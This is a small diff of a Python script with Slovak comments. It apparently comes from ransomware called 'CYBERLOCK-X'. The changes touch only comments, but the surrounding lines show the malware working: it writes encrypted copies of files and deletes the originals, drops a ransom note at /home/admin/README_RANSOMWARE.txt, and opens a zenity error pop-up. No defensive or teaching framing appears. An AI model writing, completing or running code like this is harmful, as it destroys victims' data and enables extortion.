@@ -23,7 +23,7 @@ for directory in dirs_to_encrypt:
                 enc_file.write(encrypted_data)
             os.remove(filepath)
 
-# Vytvor ransom poznámku
+# Ransomware poznámka
 ransom_message = '''
 ⚠️ VAŠE SÚBORY BOLI ZAŠIFROVANÉ RANSOMWAROM "CYBERLOCK-X" ⚠️
 
@@ -68,7 +68,7 @@ CYBERLOCK-X Team
 with open('/home/admin/README_RANSOMWARE.txt', 'w') as ransom_note:
     ransom_note.write(ransom_message)
 
-# Otvorenie grafického pop-up okna (skrátená verzia, pretože pop-up nepodporuje dlhý text)
+# Otvorenie grafického pop-up okna 
 subprocess.Popen([
     'zenity',
     '--error',
